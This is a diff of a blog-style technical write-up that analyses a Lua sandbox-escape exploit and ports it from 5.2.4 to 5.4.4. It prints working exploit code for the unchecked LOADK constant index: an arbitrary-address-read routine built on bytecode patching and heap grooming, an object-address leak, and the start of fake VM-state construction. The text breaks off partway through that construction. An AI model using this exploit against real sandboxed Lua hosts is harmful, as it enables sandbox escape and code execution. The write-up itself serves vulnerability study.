@@ -118,7 +118,7 @@
             <a class="u-url" rel="me" href="https://github.com/Lua-Project"><i class="fab fa-github-square fa-lg" title="GitHub"></i></a>
           </li></ul>
 
-<span class="read-time">~1 min read</span>
+<span class="read-time">9 min read</span>
 
     <time class="page-date dt-published" datetime="2021-12-03T00:00:00+09:00"><a class="u-url" href="">December 3, 2021</a>
 </time>
@@ -146,10 +146,404 @@
 
 <h1 id="1-sandbox-escape">1. Sandbox escape</h1>
 
-<p><a href="https://github.com/Lua-Project/lua-5.4.4-sandbox-escape">lua-5.4.4-sandbox-escape</a></p>
+<p>The follwing is an analysis of the existing version of the sandbox escaping exploit code of 5.2.4 and applying it to 5.4.4. For modifications according to the version, see <a href="https://github.com/Lua-Project/lua-5.4.4-sandbox-escape">lua-5.4.4-sandbox-escape</a>, and for the existing 5.2.4 version of the exploit code, see <a href="https://github.com/erezto/lua-sandbox-escape">lua-5.2.4-sandbox-escape</a>.</p>
 
+<h2 id="contents">Contents</h2>
+<ul>
+  <li>Background
+    <ul>
+      <li>tostring</li>
+      <li>Bytecode</li>
+      <li>string.gsub</li>
+      <li>string.dump</li>
+    </ul>
+  </li>
+  <li>Root Cause
+    <ul>
+      <li>LOADK</li>
+      <li>CONSTANTS</li>
+    </ul>
+  </li>
+  <li>Exploit
+    <ul>
+      <li>AAR(Arbitary Address Read)</li>
+      <li>Fake object</li>
+      <li>Call frealloc</li>
+    </ul>
+  </li>
+  <li>Reference</li>
+</ul>
+
+<h2 id="background">Background</h2>
+
+<h3 id="tostring">tostring</h3>
+
+<p>If the metatable of the object that came over to the factor as one of the Lua function has <code class="language-plaintext highlighter-rouge">__tostring</code> as a key value, it is called as function. When an object with data types such as <code class="language-plaintext highlighter-rouge">function</code>, <code class="language-plaintext highlighter-rouge">table</code>, <code class="language-plaintext highlighter-rouge">userdata</code>, and <code class="language-plaintext highlighter-rouge">thread</code> that exist as built-in inside Lua, the address of the object is exposed as it is as follows.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Lua 5.4.4  Copyright <span class="o">(</span>C<span class="o">)</span> 1994-2021 Lua.org, PUC-Rio
+  <span class="o">&gt;</span> tostring<span class="o">(</span>print<span class="o">)</span>
+  <span class="k">function</span>: 0x564ebc5a0ab0
+  <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<h3 id="bytecode">Bytecode</h3>
+
+<p>Lua is a register-based virtual machine. Bytecode is created and interpreted by parsing the code and executed. I’ll explain it with an example.</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">local</span> <span class="k">function</span> <span class="nf">foo</span><span class="p">()</span>
+    <span class="kd">local</span> <span class="n">a</span><span class="o">=</span><span class="s2">"a"</span> <span class="n">a</span><span class="o">=</span><span class="s2">"b"</span> <span class="n">a</span><span class="o">=</span><span class="s2">"c"</span> 
+    <span class="k">return</span> <span class="p">(</span><span class="o">#</span><span class="n">a</span><span class="p">)</span>
+  <span class="k">end</span>
+
+  <span class="n">foo</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">foo</code> function used in the code above is converted to the byte code below.</p>
+
+<p><code class="language-plaintext highlighter-rouge">example of bytecode</code>
+  <img src="http://localhost:4000/images/previous-vulnerabilities/bytecode1.png" alt="image-center" class="align-center" /></p>
+
+<p>This converted byte code is interpreted and executed inside Lua.</p>
+
+<h3 id="stringgsub">string.gsub</h3>
+
+<p>This function is used to replace some of the strings with other strings. Briefly explaining the operation of the function, it returns a value obtained by replacing the string entered as the first argument with the remaining arguments. For more information, please refer to <a href="http://www.lua.org/manual/5.4/manual.html#pdf-string.gsub">string.gsub</a>.</p>
+
+<h3 id="stringdump">string.dump</h3>
+
+<p>Returns a string expressed as a binary chunk of the function passed as an argument. In this case, the binary chunk is the bytecode. After that, you can use it by putting the returned string in the <code class="language-plaintext highlighter-rouge">load</code> function. For more information, please refer to <a href="http://www.lua.org/manual/5.4/manual.html#pdf-string.dump">string.dump</a>.</p>
+
+<h2 id="root-cause">Root cause</h2>
+
+<h3 id="loadk">LOADK</h3>
+
+<p>Each bytecode used in Lua occupies 4bytes. Among them, in the case of the LOADK instruction, it has iABx among the follwing instruction formats.</p>
+
+<p><img src="http://localhost:4000/images/previous-vulnerabilities/loadk1.png" alt="image-center" class="align-center" /></p>
+
+<p>Also, LOADK has the follwing format.</p>
+
+<p><img src="http://localhost:4000/images/previous-vulnerabilities/loadk2.png" alt="image-center" class="align-center" /></p>
+
+<p>where R(A) represents the numbering of the virtual register used in the bytecode. A register corresponding to each number exists (e.g. R(1), R(2), …) and an operation is performed using it as a variable.</p>
+
+<p>In addition, in the case of Bx, it means the index of CONSTANTS, which will be explained in detail later. (Specifies the number of variables in the CONSTANTS array.)</p>
+
+<p>When you see the code that actually runs the LOADK,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">vmcase</span><span class="p">(</span><span class="n">OP_LOADK</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">TValue</span> <span class="o">*</span><span class="n">rb</span> <span class="o">=</span> <span class="n">k</span> <span class="o">+</span> <span class="n">GETARG_Bx</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+        <span class="n">setobj2s</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">ra</span><span class="p">,</span> <span class="n">rb</span><span class="p">);</span>
+        <span class="n">vmbreak</span><span class="p">;</span>
+      <span class="p">}</span>
+</code></pre></div></div>
+
+<p>The part where the vulnerability occurs is that there is no verification process for the Bx just described. For this reason, if an attacker finds out the address of the CONSTANTS and the offset between the address where the desired value is located and the address of the CONSTANTS, the desired value can be loaded into the desired virtual register.</p>
+
+<h3 id="constants">CONSTANTS</h3>
+
+<p>CONSTANTS is a space to store variables necessary for function operation, such as function names and strings used in lua bytecode.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">static</span> <span class="kt">void</span> <span class="nf">loadConstants</span> <span class="p">(</span><span class="n">LoadState</span> <span class="o">*</span><span class="n">S</span><span class="p">,</span> <span class="n">Proto</span> <span class="o">*</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">loadInt</span><span class="p">(</span><span class="n">S</span><span class="p">);</span>
+    <span class="n">f</span><span class="o">-&gt;</span><span class="n">k</span> <span class="o">=</span> <span class="n">luaM_newvectorchecked</span><span class="p">(</span><span class="n">S</span><span class="o">-&gt;</span><span class="n">L</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">TValue</span><span class="p">);</span>
+    <span class="n">f</span><span class="o">-&gt;</span><span class="n">sizek</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>
+  
+    <span class="cm">/* skipped */</span>
+
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>CONSTANTS actually used in the code is being used as variable k in the <code class="language-plaintext highlighter-rouge">luaV_execute</code> function. The variable is allocated space in the above <code class="language-plaintext highlighter-rouge">loadConstants</code>, and the heap chunk is finally allocated by malloc.</p>
+
+<p>As mentioned above, the attacker must know the address of CONSTANTS to load the desired value. To solve this, the collectgarbage function is used to induce the attacker to allocate the desired chunk to CONSTANTS.</p>
+
+<p>The details will be explained in the AAR section.</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<h3 id="aararbitary-address-read">AAR(Arbitary Address Read)</h3>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">local</span> <span class="k">function</span> <span class="nf">_objAddr</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">tonumber</span><span class="p">(</span><span class="nb">tostring</span><span class="p">(</span><span class="n">o</span><span class="p">):</span><span class="n">match</span><span class="p">(</span><span class="s1">'^%a+: 0x(%x+)$'</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+  <span class="k">end</span>
+
+  <span class="kd">local</span> <span class="k">function</span> <span class="nf">readAddr</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="nb">collectgarbage</span><span class="p">()</span>
+
+    <span class="kd">local</span> <span class="k">function</span> <span class="nf">foo</span><span class="p">()</span>
+        <span class="kd">local</span> <span class="n">a</span><span class="o">=</span><span class="s2">"a"</span> <span class="n">a</span><span class="o">=</span><span class="s2">"b"</span> <span class="n">a</span><span class="o">=</span><span class="s2">"c"</span> 
+        <span class="k">return</span> <span class="p">(</span><span class="o">#</span><span class="n">a</span><span class="p">)</span>
+    <span class="k">end</span>
+
+    <span class="kd">local</span> <span class="n">_k</span><span class="o">=</span><span class="p">{}</span>
+    <span class="kd">local</span> <span class="n">_str</span><span class="o">=</span><span class="p">{}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">tostring</span><span class="p">(</span><span class="n">_k</span><span class="p">)</span><span class="o">&gt;</span><span class="nb">tostring</span><span class="p">(</span><span class="n">_str</span><span class="p">))</span> <span class="k">then</span>
+        <span class="kd">local</span> <span class="n">_t</span> <span class="o">=</span> <span class="n">_str</span>
+        <span class="n">_str</span> <span class="o">=</span> <span class="n">_k</span>
+        <span class="n">_k</span> <span class="o">=</span> <span class="n">_t</span>
+    <span class="k">end</span>
+    <span class="kd">local</span> <span class="n">_intermid</span><span class="o">=</span><span class="p">{}</span>
+    <span class="kd">local</span> <span class="n">_str_addr</span> <span class="o">=</span> <span class="n">_objAddr</span><span class="p">(</span><span class="n">_str</span><span class="p">)</span>
+
+    <span class="kd">local</span> <span class="n">_addr</span> <span class="o">=</span> <span class="n">numTo64L</span><span class="p">(</span><span class="n">addr</span> <span class="o">-</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">padding_a</span> <span class="o">=</span> <span class="nb">string.rep</span><span class="p">(</span><span class="s1">'</span><span class="se">\65</span><span class="s1">'</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">-- 0x41 padding</span>
+    <span class="kd">local</span> <span class="n">padding_b</span> <span class="o">=</span> <span class="nb">string.rep</span><span class="p">(</span><span class="s1">'</span><span class="se">\20</span><span class="s1">'</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span> <span class="c1">-- LUA_VLNGSTR tag padding</span>
+
+    <span class="nb">collectgarbage</span><span class="p">()</span>
+    <span class="n">_str</span> <span class="o">=</span> <span class="kc">nil</span>
+    <span class="n">_intermid</span><span class="o">=</span><span class="kc">nil</span>
+    <span class="nb">collectgarbage</span><span class="p">()</span>
+    
+    <span class="n">_str</span> <span class="o">=</span> <span class="n">padding_a</span> <span class="o">..</span> <span class="n">_addr</span> <span class="o">..</span> <span class="n">padding_b</span><span class="p">;</span>
+    
+
+    <span class="n">foo</span> <span class="o">=</span> <span class="nb">string.dump</span><span class="p">(</span><span class="n">foo</span><span class="p">)</span>
+    <span class="n">foo</span> <span class="o">=</span> <span class="n">foo</span><span class="p">:</span><span class="nb">gsub</span><span class="p">(</span><span class="err">escapeString</span><span class="p">(</span><span class="err">createLOADK</span><span class="p">(</span><span class="err">0</span><span class="p">,</span><span class="err">2</span><span class="p">)),</span>
+        <span class="n">escapeString</span><span class="p">(</span><span class="n">createLOADK</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">_str_addr</span><span class="o">+</span><span class="mh">0x20</span> <span class="o">-</span> <span class="n">_objAddr</span><span class="p">(</span><span class="n">_k</span><span class="p">))</span><span class="o">/</span><span class="mi">16</span> <span class="p">)))</span> 
+    <span class="n">_intermid</span> <span class="o">=</span> <span class="p">{}</span>
+
+    <span class="nb">collectgarbage</span><span class="p">()</span>
+    <span class="n">_intermid</span> <span class="o">=</span> <span class="kc">nil</span>
+    <span class="n">_k</span><span class="o">=</span><span class="kc">nil</span>
+    <span class="nb">collectgarbage</span><span class="p">()</span>
+
+    <span class="n">foo</span> <span class="o">=</span> <span class="nb">load</span><span class="p">(</span><span class="n">foo</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">foo</span><span class="p">()</span>
+  <span class="k">end</span>
+
+
+  <span class="kd">local</span> <span class="k">function</span> <span class="nf">objAddr</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">known_objects</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">known_objects</span><span class="p">[</span><span class="s1">'thread'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">known_objects</span><span class="p">[</span><span class="s1">'function'</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">known_objects</span><span class="p">[</span><span class="s1">'userdata'</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">known_objects</span><span class="p">[</span><span class="s1">'table'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="kd">local</span> <span class="n">tp</span> <span class="o">=</span> <span class="nb">type</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">known_objects</span><span class="p">[</span><span class="n">tp</span><span class="p">])</span> <span class="k">then</span> <span class="k">return</span> <span class="n">_objAddr</span><span class="p">(</span><span class="n">o</span><span class="p">)</span> <span class="k">end</span>
+
+    <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="nb">coroutine.yield</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="k">end</span>
+    <span class="kd">local</span> <span class="n">t</span> <span class="o">=</span> <span class="nb">coroutine.create</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">top</span> <span class="o">=</span> <span class="n">readAddr</span><span class="p">(</span><span class="n">_objAddr</span><span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> 
+
+    <span class="nb">coroutine.resume</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">o</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">readAddr</span><span class="p">(</span><span class="n">top</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">addr</span>
+  <span class="k">end</span>
+
+  <span class="kd">local</span> <span class="k">function</span> <span class="nf">bufferAddress</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">objAddr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span>
+  <span class="k">end</span>
+</code></pre></div></div>
+
+<p>The code above is the part that does AAR. Before explaining the <code class="language-plaintext highlighter-rouge">readAddr</code> function used in AAR, let’s first explain about <code class="language-plaintext highlighter-rouge">OP_LEN</code>, one of the bytecode commands.</p>
+
+<p>If you use <code class="language-plaintext highlighter-rouge">#</code> that returns the length of an object in the lua code, <code class="language-plaintext highlighter-rouge">OP_LEN</code> is used internally in the bytecode.</p>
+
+<p><img src="http://localhost:4000/images/previous-vulnerabilities/AAR1.png" alt="image-center" class="align-center" /></p>
+
+<p>The format of the <code class="language-plaintext highlighter-rouge">OP_LEN</code> bytecode is as above, and looking at the actual code</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">vmcase</span><span class="p">(</span><span class="n">OP_LEN</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">Protect</span><span class="p">(</span><span class="n">luaV_objlen</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">ra</span><span class="p">,</span> <span class="n">vRB</span><span class="p">(</span><span class="n">i</span><span class="p">)));</span>
+    <span class="n">vmbreak</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>You can see that it calls the <code class="language-plaintext highlighter-rouge">luaV_objlen</code> function internally. Looking at this</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="cm">/*
+  ** Main operation 'ra = #rb'.
+  */</span>
+  <span class="kt">void</span> <span class="nf">luaV_objlen</span> <span class="p">(</span><span class="n">lua_State</span> <span class="o">*</span><span class="n">L</span><span class="p">,</span> <span class="n">StkId</span> <span class="n">ra</span><span class="p">,</span> <span class="k">const</span> <span class="n">TValue</span> <span class="o">*</span><span class="n">rb</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">const</span> <span class="n">TValue</span> <span class="o">*</span><span class="n">tm</span><span class="p">;</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">ttypetag</span><span class="p">(</span><span class="n">rb</span><span class="p">))</span> <span class="p">{</span>
+      <span class="cm">/* skipped */</span>
+      <span class="k">case</span> <span class="n">LUA_VSHRSTR</span><span class="p">:</span> <span class="p">{</span>
+        <span class="n">setivalue</span><span class="p">(</span><span class="n">s2v</span><span class="p">(</span><span class="n">ra</span><span class="p">),</span> <span class="n">tsvalue</span><span class="p">(</span><span class="n">rb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">shrlen</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">case</span> <span class="n">LUA_VLNGSTR</span><span class="p">:</span> <span class="p">{</span>
+        <span class="n">setivalue</span><span class="p">(</span><span class="n">s2v</span><span class="p">(</span><span class="n">ra</span><span class="p">),</span> <span class="n">tsvalue</span><span class="p">(</span><span class="n">rb</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">u</span><span class="p">.</span><span class="n">lnglen</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="cm">/* skipped */</span>
+  <span class="p">}</span>
+
+  <span class="cm">/*
+  ** Header for a string value.
+  */</span>
+  <span class="k">typedef</span> <span class="k">struct</span> <span class="nc">TString</span> <span class="p">{</span>
+    <span class="n">CommonHeader</span><span class="p">;</span>
+    <span class="n">lu_byte</span> <span class="n">extra</span><span class="p">;</span>  <span class="cm">/* reserved words for short strings; "has hash" for longs */</span>
+    <span class="n">lu_byte</span> <span class="n">shrlen</span><span class="p">;</span>  <span class="cm">/* length for short strings */</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">hash</span><span class="p">;</span>
+    <span class="k">union</span> <span class="p">{</span>
+      <span class="kt">size_t</span> <span class="n">lnglen</span><span class="p">;</span>  <span class="cm">/* length for long strings */</span>
+      <span class="k">struct</span> <span class="nc">TString</span> <span class="o">*</span><span class="n">hnext</span><span class="p">;</span>  <span class="cm">/* linked list for hash table */</span>
+    <span class="p">}</span> <span class="n">u</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">contents</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+  <span class="p">}</span> <span class="n">TString</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>If you look inside the <code class="language-plaintext highlighter-rouge">luaV_objlen</code> function, it checks the typetag of the <code class="language-plaintext highlighter-rouge">rb</code> value passed as an argument, and returns <code class="language-plaintext highlighter-rouge">shrlen</code> in case of <code class="language-plaintext highlighter-rouge">LUA_VSHRSTR</code> and <code class="language-plaintext highlighter-rouge">lnglen</code> in case of <code class="language-plaintext highlighter-rouge">LUA_VLNGSTR</code>.</p>
+
+<p>Now let’s go back to the AAR code and take a look at the <code class="language-plaintext highlighter-rouge">readAddr</code> function.</p>
+
+<p>When the <code class="language-plaintext highlighter-rouge">foo</code> function used in the first part is converted into byte code, it is converted as shown in <code class="language-plaintext highlighter-rouge">example of bytecode</code>. As mentioned above, by using the vulnerability of <code class="language-plaintext highlighter-rouge">LOADK</code> the desired address is substituted for the string, and then the value of the desired address is found through the <code class="language-plaintext highlighter-rouge">OP_LEN</code> instruction.</p>
+
+<p>The collectgarbage function is used to satisfy the two conditions mentioned in the root cause part. After assigning the declared variable to nil, executing collectgarbage(), and then declaring a variable of the same size, a chunk with the same address is allocated.</p>
+
+<p>Using this point, it induces the attacker to allocate the chunk of the variable declared by the attacker to the variable <code class="language-plaintext highlighter-rouge">k</code>, finds the distance between this variable and the desired address, and sets the offset using <code class="language-plaintext highlighter-rouge">string.dump</code></p>
+
+<p>First set the variable <code class="language-plaintext highlighter-rouge">k</code> you want to assign and the location of the address you want to read.</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">local</span> <span class="n">_k</span><span class="o">=</span><span class="p">{}</span>
+  <span class="kd">local</span> <span class="n">_str</span><span class="o">=</span><span class="p">{}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">tostring</span><span class="p">(</span><span class="n">_k</span><span class="p">)</span><span class="o">&gt;</span><span class="nb">tostring</span><span class="p">(</span><span class="n">_str</span><span class="p">))</span> <span class="k">then</span>
+      <span class="kd">local</span> <span class="n">_t</span> <span class="o">=</span> <span class="n">_str</span>
+      <span class="n">_str</span> <span class="o">=</span> <span class="n">_k</span>
+      <span class="n">_k</span> <span class="o">=</span> <span class="n">_t</span>
+  <span class="k">end</span>
+</code></pre></div></div>
+
+<p>In this code, the <code class="language-plaintext highlighter-rouge">_k</code> variable must not be located at an address higher than the position of the <code class="language-plaintext highlighter-rouge">_str</code> variable on the virtual memory addres, so in this case, the two variables are replaced.</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">local</span> <span class="n">_addr</span> <span class="o">=</span> <span class="n">numTo64L</span><span class="p">(</span><span class="n">addr</span> <span class="o">-</span> <span class="mi">16</span><span class="p">)</span>
+  <span class="kd">local</span> <span class="n">padding_a</span> <span class="o">=</span> <span class="nb">string.rep</span><span class="p">(</span><span class="s1">'</span><span class="se">\65</span><span class="s1">'</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">-- 0x41 padding</span>
+  <span class="kd">local</span> <span class="n">padding_b</span> <span class="o">=</span> <span class="nb">string.rep</span><span class="p">(</span><span class="s1">'</span><span class="se">\20</span><span class="s1">'</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span> <span class="c1">-- LUA_VLNGSTR tag padding</span>
+</code></pre></div></div>
+
+<p>After that, it creates a string padded with a padding value of 0x41, an address subtracted by 0x10 from the address to be read (because the length variable is stored at 0x10 based on the <code class="language-plaintext highlighter-rouge">TString</code> structure), and a <code class="language-plaintext highlighter-rouge">LUA_VLNSTR</code> tag. After calculating the position of the generated string, the offset of the <code class="language-plaintext highlighter-rouge">LOADK</code> instruction is replaced.</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">foo</span> <span class="o">=</span> <span class="nb">string.dump</span><span class="p">(</span><span class="n">foo</span><span class="p">)</span>
+  <span class="n">foo</span> <span class="o">=</span> <span class="n">foo</span><span class="p">:</span><span class="nb">gsub</span><span class="p">(</span><span class="err">escapeString</span><span class="p">(</span><span class="err">createLOADK</span><span class="p">(</span><span class="err">0</span><span class="p">,</span><span class="err">2</span><span class="p">)),</span>
+          <span class="n">escapeString</span><span class="p">(</span><span class="n">createLOADK</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">_str_addr</span><span class="o">+</span><span class="mh">0x20</span> <span class="o">-</span> <span class="n">_objAddr</span><span class="p">(</span><span class="n">_k</span><span class="p">))</span><span class="o">/</span><span class="mi">16</span> <span class="p">)))</span> 
+
+  <span class="nb">collectgarbage</span><span class="p">()</span>
+  <span class="n">_k</span><span class="o">=</span><span class="kc">nil</span>
+  <span class="nb">collectgarbage</span><span class="p">()</span>
+
+  <span class="n">foo</span> <span class="o">=</span> <span class="nb">load</span><span class="p">(</span><span class="n">foo</span><span class="p">)</span>
+  <span class="k">return</span> <span class="n">foo</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>If you execute the <code class="language-plaintext highlighter-rouge">foo</code> function replaced with <code class="language-plaintext highlighter-rouge">string.gsub</code> as above, AAR to find out the value assigned to the address attacker wants to read becomes possible. Implement <code class="language-plaintext highlighter-rouge">objAddr</code>, a function that finds the address of an object using the <code class="language-plaintext highlighter-rouge">readAddr</code> function implemented in this way.</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">local</span> <span class="k">function</span> <span class="nf">objAddr</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">known_objects</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">known_objects</span><span class="p">[</span><span class="s1">'thread'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">known_objects</span><span class="p">[</span><span class="s1">'function'</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">known_objects</span><span class="p">[</span><span class="s1">'userdata'</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">known_objects</span><span class="p">[</span><span class="s1">'table'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="kd">local</span> <span class="n">tp</span> <span class="o">=</span> <span class="nb">type</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">known_objects</span><span class="p">[</span><span class="n">tp</span><span class="p">])</span> <span class="k">then</span> <span class="k">return</span> <span class="n">_objAddr</span><span class="p">(</span><span class="n">o</span><span class="p">)</span> <span class="k">end</span>
+
+    <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="nb">coroutine.yield</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="k">end</span>
+    <span class="kd">local</span> <span class="n">t</span> <span class="o">=</span> <span class="nb">coroutine.create</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">top</span> <span class="o">=</span> <span class="n">readAddr</span><span class="p">(</span><span class="n">_objAddr</span><span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1">--The field top is in offset 0x10</span>
+
+    <span class="nb">coroutine.resume</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">o</span><span class="p">)</span>
+    <span class="kd">local</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">readAddr</span><span class="p">(</span><span class="n">top</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">addr</span>
+  <span class="k">end</span>
+</code></pre></div></div>
+
+<p>In the <code class="language-plaintext highlighter-rouge">objAddr</code> function, if there are four data types (<code class="language-plaintext highlighter-rouge">thread</code>, <code class="language-plaintext highlighter-rouge">function</code>, <code class="language-plaintext highlighter-rouge">userdata</code>, <code class="language-plaintext highlighter-rouge">table</code>) in which the address of data is indicated by the <code class="language-plaintext highlighter-rouge">tostring</code> function, it is obtained directly through <code class="language-plaintext highlighter-rouge">_objAddr</code>. In other cases, the <code class="language-plaintext highlighter-rouge">readAddr</code> function is executed using the <code class="language-plaintext highlighter-rouge">top</code> member variable in <code class="language-plaintext highlighter-rouge">lua_State</code> after putting it as an argument of the coroutine that executes <code class="language-plaintext highlighter-rouge">coroutine.yield</code>. The value of the input address is read through two function executions (once the value pointed to by <code class="language-plaintext highlighter-rouge">top</code>, and once AAR is performed using the value).</p>
+
+<h3 id="fake-object">Fake object</h3>
+
+<p>Now, create <code class="language-plaintext highlighter-rouge">fake lua_State</code> and <code class="language-plaintext highlighter-rouge">fake global_State</code> using the AAR described above.</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="k">function</span><span class="p">()</span> <span class="nb">coroutine.yield</span><span class="p">()</span> <span class="kd">local</span> <span class="n">a</span> <span class="o">=</span> <span class="nb">string.rep</span><span class="p">(</span><span class="s1">'asda'</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span> <span class="k">end</span>
+  <span class="kd">local</span> <span class="n">t</span> <span class="o">=</span> <span class="nb">coroutine.create</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+  <span class="nb">coroutine.resume</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+  <span class="kd">local</span> <span class="n">t_addr</span> <span class="o">=</span> <span class="n">objAddr</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+
+  <span class="kd">local</span> <span class="n">l_G_addr</span> <span class="o">=</span> <span class="n">readAddr</span><span class="p">(</span><span class="n">readAddr</span><span class="p">(</span><span class="n">t_addr</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span>
+  <span class="n">l_G</span> <span class="o">=</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">l_G_addr</span><span class="p">,</span> <span class="mi">1416</span><span class="p">)</span> <span class="c1">-- sizeof(global_State)=1416</span>
+  <span class="n">l_G</span> <span class="o">=</span> <span class="n">numTo64L</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">..</span> <span class="n">numTo64L</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span> <span class="o">..</span> <span class="n">l_G</span><span class="p">:</span><span class="n">sub</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>
+  <span class="n">l_G_addr</span> <span class="o">=</span> <span class="n">bufferAddress</span><span class="p">(</span><span class="n">l_G</span><span class="p">)</span>
+
